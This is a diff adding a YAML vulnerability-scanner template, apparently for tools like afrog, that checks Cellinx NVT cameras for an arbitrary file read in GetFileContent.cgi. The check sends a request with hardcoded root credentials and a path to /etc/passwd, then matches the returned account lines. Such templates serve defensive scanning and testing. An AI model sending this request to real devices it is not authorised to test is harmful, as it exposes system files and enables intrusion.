@@ -1,0 +1,17 @@
+id: cellinxnvt-getfilecontent-cgi-fileread
+
+info:
+  name: Cellinx NVT - GetFileContent.cgi - FileRead
+  author: zan8in
+  severity: high
+  verified: false
+  tags: cellinxnvt,fileread
+  created: 2024/01/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
